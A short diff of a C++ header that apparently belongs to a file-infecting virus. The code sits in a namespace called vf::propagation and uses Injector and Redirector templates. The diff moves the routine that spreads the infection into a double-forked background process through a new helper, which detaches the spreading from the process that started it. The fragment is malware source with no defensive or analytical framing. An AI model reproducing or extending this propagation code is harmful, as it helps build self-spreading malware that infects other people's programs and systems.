@@ -1,5 +1,6 @@
 #pragma once
 
+#include "common/double_fork.hh"
 #include "common/get_symbol_addr.hh"
 #include "common/mmap.hh"
 #include "infector/common_infection.hh"
@@ -77,20 +78,8 @@ size_t propagate() {
 // allows tree walks to happen in a forked process.
 template <typename DirIteratorT, typename Injector, typename Redirector>
 void forked_propagate() {
-  auto child_pid = vf::fork();
-  // If we are child then perform propagation.
-  if (!child_pid) {
-    // create a grandchild that performs the work.
-    auto grandchild_pid = vf::fork();
-    if (!grandchild_pid) {
-      // perform propagation in grandchild process.
-      (void)propagate<DirIteratorT, Injector, Redirector>();
-    }
-    exit(0);
-  }
-
-  // parent waits for the child so we do not create zombie processes.
-  vf::waitpid(child_pid, nullptr, 0);
+  common::double_fork(
+      []() { propagate<DirIteratorT, Injector, Redirector>(); });
 }
 
 }  // namespace vf::propagation
